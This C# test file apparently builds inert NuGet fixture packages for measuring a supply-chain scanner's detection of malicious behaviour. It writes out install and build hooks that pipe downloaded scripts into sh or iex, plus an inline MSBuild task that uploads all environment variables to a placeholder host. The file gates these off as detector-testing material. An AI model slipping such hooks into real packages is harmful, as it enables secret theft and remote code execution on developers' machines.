namespace Silvergun.CLI.Tests.Behaviour;

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;

/// <summary>
/// The 48 behaviour packages (29 malicious, 19 twins), as data, and the BCL-zip builder that turns one into a
/// <c>.nupkg</c>. Fixture assemblies are located BY FILE NAME next to this test assembly (the project references only copy
/// them there) and copied as bytes: nothing loads or runs them. The script-only packages (BF01-BF03) carry their text here.
/// All script text points at reserved hosts and is gated off (<c>SilvergunBehaviourArmed</c>), so it is inert even if run.
/// </summary>
public static class BehaviourPackages
{
    #region Properties
    public static IReadOnlyList<PackageDef> All { get; } = Build();
    #endregion

    #region Methods
    /// <summary>The fixture assembly file for a fixture project such as <c>BF07a.Malicious</c>.</summary>
    public static string AssemblyPath(string project) =>
        Path.Combine(AppContext.BaseDirectory, $"Silvergun.Behaviour.{project}.dll");

    public static string Project(string id, Side side) => $"{id}.{side}";

    /// <summary>Writes the package into <paramref name="directory"/> and returns its path.</summary>
    public static string WriteNupkg(PackageDef package, string directory)
    {
        var nuspec = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <package xmlns="{NuspecNamespace}">
              <metadata>
                <id>{package.PackageId}</id>
                <version>1.0.0</version>
                <authors>Silvergun Tests</authors>
                <description>Inert behaviour fixture {package.Id} ({package.Side}) of the recall measurement; never executed.</description>
              </metadata>
            </package>
            """;

        var path = Path.Combine(directory, $"{package.PackageId}.1.0.0.nupkg");
        using var stream = new FileStream(path, FileMode.Create, FileAccess.Write);
        using var zip = new ZipArchive(stream, ZipArchiveMode.Create);
        Write(zip, $"{package.PackageId}.nuspec", Encoding.UTF8.GetBytes(nuspec));
        foreach (var (entry, bytes) in package.Entries)
            Write(zip, entry, bytes());
        return path;

        static void Write(ZipArchive zip, string name, byte[] bytes)
        {
            using var s = zip.CreateEntry(name).Open();
            s.Write(bytes, 0, bytes.Length);
        }
    }

    private static List<PackageDef> Build()
    {
        var all = new List<PackageDef>();

        // One fixture assembly per package, in the folder the row's Vector names.
        void Assembly(string id, Side side, string folder) =>
            all.Add(new PackageDef(id, side, [Dll(Project(id, side), folder)]));
        void Script(string id, Side side, string entry, string text) =>
            all.Add(new PackageDef(id, side, [(entry, () => Encoding.UTF8.GetBytes(text))]));

        // BF01 - build-time Exec of a downloaded script; twin: dotnet tool restore.
        Script("BF01a", Side.Malicious, "build/Silvergun.Behaviour.BF01a.Malicious.targets", Targets("""<Exec Command="curl -fsSL https://example.test/silvergun-behaviour-suite/payload.sh | sh" />"""));
        Script("BF01b", Side.Malicious, "build/Silvergun.Behaviour.BF01b.Malicious.targets", Targets("""<Exec Command="powershell -NoProfile -Command &quot;iwr https://example.test/silvergun-behaviour-suite/payload.ps1 -UseBasicParsing | iex&quot;" />"""));
        Script("BF01", Side.Twin, "build/Silvergun.Behaviour.BF01.Twin.targets", Targets("""<Exec Command="dotnet tool restore" />"""));

        // BF02 - an inline task (RoslynCodeTaskFactory) over environment variables and the network; twin: writes a version file.
        Script("BF02", Side.Malicious, "build/Silvergun.Behaviour.BF02.Malicious.targets", InlineTask("""
            var sb = new System.Text.StringBuilder();
            foreach (System.Collections.DictionaryEntry e in System.Environment.GetEnvironmentVariables())
                sb.Append(e.Key).Append('=').Append(e.Value).Append('\n');
            using (var client = new System.Net.WebClient())
                client.UploadString("https://example.test/silvergun-behaviour-suite/collect", sb.ToString());
            """));
        Script("BF02", Side.Twin, "build/Silvergun.Behaviour.BF02.Twin.targets", InlineTask("""
            System.IO.File.WriteAllText("version.txt", "1.0.0");
            """));

        // BF03 - legacy install-time init.ps1; twin: a banner.
        Script("BF03", Side.Malicious, "tools/init.ps1", """
            param($installPath, $toolsPath, $package, $project)
            if ($env:SILVERGUN_BEHAVIOUR_ARMED -eq '1') {
                iex ((New-Object System.Net.WebClient).DownloadString('https://example.test/silvergun-behaviour-suite/payload.ps1'))
            }
            """);
        Script("BF03", Side.Twin, "tools/init.ps1", """
            param($installPath, $toolsPath, $package, $project)
            if ($env:SILVERGUN_BEHAVIOUR_ARMED -eq '1') {
                Write-Host 'Thanks for installing this package.'
            }
            """);

        // BF04 / BF05 - host-contract DLLs in build/ and analyzers/dotnet/cs/.
        Assembly("BF04", Side.Malicious, "build");
        Assembly("BF04", Side.Twin, "build");
        Assembly("BF05", Side.Malicious, "analyzers/dotnet/cs");
        Assembly("BF05", Side.Twin, "analyzers/dotnet/cs");

        // BF06 - [ModuleInitializer] in lib/. BF07..BF18 - runtime code in lib/.
        foreach (var id in new[] { "BF06", "BF07a", "BF07b", "BF07c", "BF08a", "BF08b", "BF08c", "BF08d", "BF09", "BF10", "BF11", "BF12a", "BF12b", "BF12c", "BF12d", "BF13", "BF14", "BF15", "BF16", "BF17", "BF18" })
            Assembly(id, Side.Malicious, "lib/net10.0");
        foreach (var id in new[] { "BF06", "BF07", "BF08", "BF09", "BF10", "BF11", "BF12", "BF13", "BF14", "BF15", "BF16", "BF17", "BF18" })
            Assembly(id, Side.Twin, "lib/net10.0");

        // BF19 - concealment: BF07a's malicious DLL at the package root / under content/; the twin holds BF07's twin DLL at both.
        all.Add(new PackageDef("BF19a", Side.Malicious, [Dll("BF07a.Malicious", "")]));
        all.Add(new PackageDef("BF19b", Side.Malicious, [Dll("BF07a.Malicious", "content")]));
        all.Add(new PackageDef("BF19", Side.Twin, [Dll("BF07.Twin", ""), Dll("BF07.Twin", "content")]));

        return all;
    }

    private static (string Entry, Func<byte[]> Bytes) Dll(string project, string folder) =>
        (folder.Length == 0 ? Path.GetFileName(AssemblyPath(project)) : $"{folder}/{Path.GetFileName(AssemblyPath(project))}",
         () => File.ReadAllBytes(AssemblyPath(project)));

    // Every target is gated off, so even a build that read the file would do nothing.
    private static string Targets(string task) => $"""
        <Project>
          <Target Name="SilvergunBehaviourTarget" BeforeTargets="Build" Condition="'$(SilvergunBehaviourArmed)' == 'true'">
            {task}
          </Target>
        </Project>
        """;

    private static string InlineTask(string code) => $"""
        <Project>
          <UsingTask TaskName="SilvergunBehaviourInline" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
            <Task>
              <Code Type="Fragment" Language="cs"><![CDATA[
        {code}
              ]]></Code>
            </Task>
          </UsingTask>
          <Target Name="SilvergunBehaviourTarget" BeforeTargets="Build" Condition="'$(SilvergunBehaviourArmed)' == 'true'">
            <SilvergunBehaviourInline />
          </Target>
        </Project>
        """;
    #endregion

    #region Fields
    private const string NuspecNamespace = "http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd";
    #endregion
}

/// <summary>One package: its row id and side, and its zip entries (the bytes are read when the package is written).</summary>
public sealed record PackageDef(string Id, Side Side, IReadOnlyList<(string Entry, Func<byte[]> Bytes)> Entries)
{
    public string PackageId => $"Silvergun.Behaviour.{Id}.{Side}";

    public string Key => $"{Id}/{Side}";
}
